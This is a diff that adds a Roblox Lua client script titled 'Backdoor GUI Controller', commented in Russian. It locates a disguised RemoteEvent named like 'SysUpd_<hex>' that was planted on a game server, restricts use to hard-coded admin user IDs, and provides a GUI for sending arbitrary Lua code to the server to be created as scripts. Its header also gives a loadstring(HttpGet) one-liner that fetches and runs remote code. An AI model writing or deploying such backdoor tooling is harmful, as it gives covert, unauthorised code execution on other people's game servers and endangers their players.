@@ -1,0 +1,334 @@
+--[[
+    Backdoor GUI Controller
+    Загрузите этот файл на GitHub и используйте:
+    loadstring(game:HttpGet("RAW_URL"))()
+]]
+
+-- Ваши ID администраторов (для отображения статуса)
+local ADMIN_IDS = {[10667534302] = true, [389151777] = true}
+local player = game:GetService("Players").LocalPlayer
+local isAdmin = ADMIN_IDS[player.UserId] or false
+
+-- Поиск RemoteEvent (бекдора)
+local remote = nil
+for _, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
+    if v:IsA("RemoteEvent") and v.Name:match("^SysUpd_[0-9a-f]+$") then
+        remote = v
+        break
+    end
+end
+
+if not remote then
+    warn("❌ Бекдор не найден на сервере!")
+    return
+end
+
+-- Если игрок не админ, показываем предупреждение и выходим
+if not isAdmin then
+    local notify = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local label = Instance.new("TextLabel")
+    frame.Size = UDim2.new(0, 300, 0, 100)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -50)
+    frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    label.Text = "⛔ У вас нет прав доступа к бекдору!"
+    label.Size = UDim2.new(1,0,1,0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.new(1,0,0)
+    label.Parent = frame
+    frame.Parent = notify
+    notify.Parent = player:WaitForChild("PlayerGui")
+    wait(3)
+    notify:Destroy()
+    return
+end
+
+-- Создание GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "BackdoorCreator"
+gui.ResetOnSpawn = false
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 500, 0, 400)
+main.Position = UDim2.new(0.5, -250, 0.5, -200)
+main.BackgroundColor3 = Color3.fromRGB(30,30,35)
+main.BackgroundTransparency = 0.1
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+
+-- Скругление углов
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = main
+
+-- Заголовок
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundColor3 = Color3.fromRGB(20,20,25)
+title.Text = "  Backdoor Script Creator"
+title.TextColor3 = Color3.new(1,1,1)
+title.TextSize = 18
+title.Font = Enum.Font.SourceSansBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.Parent = title
+
+-- Кнопка закрытия
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 30, 0, 30)
+close.Position = UDim2.new(1, -30, 0, 0)
+close.BackgroundColor3 = Color3.fromRGB(255,70,70)
+close.Text = "✕"
+close.TextColor3 = Color3.new(1,1,1)
+close.TextSize = 20
+close.Font = Enum.Font.SourceSansBold
+close.Parent = title
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = close
+
+-- Контейнер для элементов
+local container = Instance.new("Frame")
+container.Size = UDim2.new(1, -20, 1, -50)
+container.Position = UDim2.new(0, 10, 0, 40)
+container.BackgroundTransparency = 1
+container.Parent = main
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 10)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = container
+
+-- Выпадающий список для типа скрипта
+local typeLabel = Instance.new("TextLabel")
+typeLabel.Size = UDim2.new(1, 0, 0, 20)
+typeLabel.BackgroundTransparency = 1
+typeLabel.Text = "Тип скрипта:"
+typeLabel.TextColor3 = Color3.new(1,1,1)
+typeLabel.TextSize = 16
+typeLabel.Font = Enum.Font.SourceSans
+typeLabel.TextXAlignment = Enum.TextXAlignment.Left
+typeLabel.Parent = container
+
+local typeDropdown = Instance.new("Frame")
+typeDropdown.Size = UDim2.new(1, 0, 0, 30)
+typeDropdown.BackgroundColor3 = Color3.fromRGB(50,50,60)
+typeDropdown.Parent = container
+
+local typeCorner = Instance.new("UICorner")
+typeCorner.CornerRadius = UDim.new(0, 4)
+typeCorner.Parent = typeDropdown
+
+local typeText = Instance.new("TextLabel")
+typeText.Size = UDim2.new(1, -10, 1, 0)
+typeText.Position = UDim2.new(0, 5, 0, 0)
+typeText.BackgroundTransparency = 1
+typeText.Text = "Script"
+typeText.TextColor3 = Color3.new(1,1,1)
+typeText.TextSize = 16
+typeText.Font = Enum.Font.SourceSans
+typeText.TextXAlignment = Enum.TextXAlignment.Left
+typeText.Parent = typeDropdown
+
+local typeButton = Instance.new("TextButton")
+typeButton.Size = UDim2.new(0, 30, 1, 0)
+typeButton.Position = UDim2.new(1, -30, 0, 0)
+typeButton.BackgroundColor3 = Color3.fromRGB(70,70,80)
+typeButton.Text = "▼"
+typeButton.TextColor3 = Color3.new(1,1,1)
+typeButton.TextSize = 16
+typeButton.Font = Enum.Font.SourceSansBold
+typeButton.Parent = typeDropdown
+typeButton.MouseButton1Click:Connect(function()
+    -- Здесь можно реализовать выпадающий список, но для простоты используем кнопки циклического переключения
+    local types = {"Script", "LocalScript", "ModuleScript"}
+    local current = typeText.Text
+    for i, t in ipairs(types) do
+        if t == current then
+            local next = types[i+1] or types[1]
+            typeText.Text = next
+            break
+        end
+    end
+end)
+
+-- Выпадающий список для места размещения
+local locationLabel = Instance.new("TextLabel")
+locationLabel.Size = UDim2.new(1, 0, 0, 20)
+locationLabel.BackgroundTransparency = 1
+locationLabel.Text = "Место создания:"
+locationLabel.TextColor3 = Color3.new(1,1,1)
+locationLabel.TextSize = 16
+locationLabel.Font = Enum.Font.SourceSans
+locationLabel.TextXAlignment = Enum.TextXAlignment.Left
+locationLabel.Parent = container
+
+local locationDropdown = Instance.new("Frame")
+locationDropdown.Size = UDim2.new(1, 0, 0, 30)
+locationDropdown.BackgroundColor3 = Color3.fromRGB(50,50,60)
+locationDropdown.Parent = container
+
+local locationCorner = Instance.new("UICorner")
+locationCorner.CornerRadius = UDim.new(0, 4)
+locationCorner.Parent = locationDropdown
+
+local locationText = Instance.new("TextLabel")
+locationText.Size = UDim2.new(1, -10, 1, 0)
+locationText.Position = UDim2.new(0, 5, 0, 0)
+locationText.BackgroundTransparency = 1
+locationText.Text = "ServerScriptService"
+locationText.TextColor3 = Color3.new(1,1,1)
+locationText.TextSize = 16
+locationText.Font = Enum.Font.SourceSans
+locationText.TextXAlignment = Enum.TextXAlignment.Left
+locationText.Parent = locationDropdown
+
+local locationButton = Instance.new("TextButton")
+locationButton.Size = UDim2.new(0, 30, 1, 0)
+locationButton.Position = UDim2.new(1, -30, 0, 0)
+locationButton.BackgroundColor3 = Color3.fromRGB(70,70,80)
+locationButton.Text = "▼"
+locationButton.TextColor3 = Color3.new(1,1,1)
+locationButton.TextSize = 16
+locationButton.Font = Enum.Font.SourceSansBold
+locationButton.Parent = locationDropdown
+locationButton.MouseButton1Click:Connect(function()
+    local locations = {
+        "ServerScriptService",
+        "ReplicatedStorage",
+        "StarterPlayerScripts",
+        "StarterGui",
+        "Workspace",
+        "Lighting"
+    }
+    local current = locationText.Text
+    for i, loc in ipairs(locations) do
+        if loc == current then
+            local next = locations[i+1] or locations[1]
+            locationText.Text = next
+            break
+        end
+    end
+end)
+
+-- Поле для имени скрипта (необязательно)
+local nameLabel = Instance.new("TextLabel")
+nameLabel.Size = UDim2.new(1, 0, 0, 20)
+nameLabel.BackgroundTransparency = 1
+nameLabel.Text = "Имя скрипта (необязательно):"
+nameLabel.TextColor3 = Color3.new(1,1,1)
+nameLabel.TextSize = 16
+nameLabel.Font = Enum.Font.SourceSans
+nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+nameLabel.Parent = container
+
+local nameBox = Instance.new("TextBox")
+nameBox.Size = UDim2.new(1, 0, 0, 30)
+nameBox.BackgroundColor3 = Color3.fromRGB(50,50,60)
+nameBox.PlaceholderText = "MyScript"
+nameBox.Text = ""
+nameBox.TextColor3 = Color3.new(1,1,1)
+nameBox.TextSize = 16
+nameBox.Font = Enum.Font.SourceSans
+nameBox.ClearTextOnFocus = false
+nameBox.Parent = container
+
+local nameCorner = Instance.new("UICorner")
+nameCorner.CornerRadius = UDim.new(0, 4)
+nameCorner.Parent = nameBox
+
+-- Поле для кода скрипта
+local codeLabel = Instance.new("TextLabel")
+codeLabel.Size = UDim2.new(1, 0, 0, 20)
+codeLabel.BackgroundTransparency = 1
+codeLabel.Text = "Код скрипта:"
+codeLabel.TextColor3 = Color3.new(1,1,1)
+codeLabel.TextSize = 16
+codeLabel.Font = Enum.Font.SourceSans
+codeLabel.TextXAlignment = Enum.TextXAlignment.Left
+codeLabel.Parent = container
+
+local codeBox = Instance.new("TextBox")
+codeBox.Size = UDim2.new(1, 0, 0, 120)
+codeBox.BackgroundColor3 = Color3.fromRGB(50,50,60)
+codeBox.PlaceholderText = "-- Введите Lua код"
+codeBox.Text = "print('Hello from backdoor!')"
+codeBox.TextColor3 = Color3.new(1,1,1)
+codeBox.TextSize = 14
+codeBox.Font = Enum.Font.SourceSans
+codeBox.MultiLine = true
+codeBox.TextWrapped = true
+codeBox.ClearTextOnFocus = false
+codeBox.Parent = container
+
+local codeCorner = Instance.new("UICorner")
+codeCorner.CornerRadius = UDim.new(0, 4)
+codeCorner.Parent = codeBox
+
+-- Кнопка создания
+local createBtn = Instance.new("TextButton")
+createBtn.Size = UDim2.new(1, 0, 0, 40)
+createBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+createBtn.Text = "Создать скрипт"
+createBtn.TextColor3 = Color3.new(1,1,1)
+createBtn.TextSize = 18
+createBtn.Font = Enum.Font.SourceSansBold
+createBtn.Parent = container
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 6)
+btnCorner.Parent = createBtn
+
+-- Метка статуса
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, 0, 0, 30)
+status.BackgroundTransparency = 1
+status.Text = "Готов"
+status.TextColor3 = Color3.fromRGB(100,255,100)
+status.TextSize = 14
+status.Font = Enum.Font.SourceSans
+status.Parent = container
+
+-- Обработчик клика
+createBtn.MouseButton1Click:Connect(function()
+    local scriptType = typeText.Text
+    local location = locationText.Text
+    local scriptName = nameBox.Text
+    local source = codeBox.Text
+
+    if scriptName == "" then scriptName = nil end
+
+    status.Text = "Отправка..."
+    status.TextColor3 = Color3.fromRGB(255,255,0)
+
+    remote:FireServer("createScript", {scriptType, location, scriptName, source})
+end)
+
+-- Обработка ответов от сервера
+remote.OnClientEvent:Connect(function(event, data)
+    if event == "scriptCreated" then
+        status.Text = "✅ Скрипт создан: " .. data
+        status.TextColor3 = Color3.fromRGB(100,255,100)
+    elseif event == "error" then
+        status.Text = "❌ Ошибка: " .. data
+        status.TextColor3 = Color3.fromRGB(255,100,100)
+    elseif event == "locations" then
+        -- можно обновить список, но пока не нужно
+    elseif event == "types" then
+        -- аналогично
+    elseif event == "pong" then
+        status.Text = "✅ Связь с сервером есть. Remote: " .. data.remoteName
+    end
+end)
+
+-- Пинг для проверки связи
+remote:FireServer("ping")
+
+gui.Parent = player:WaitForChild("PlayerGui")
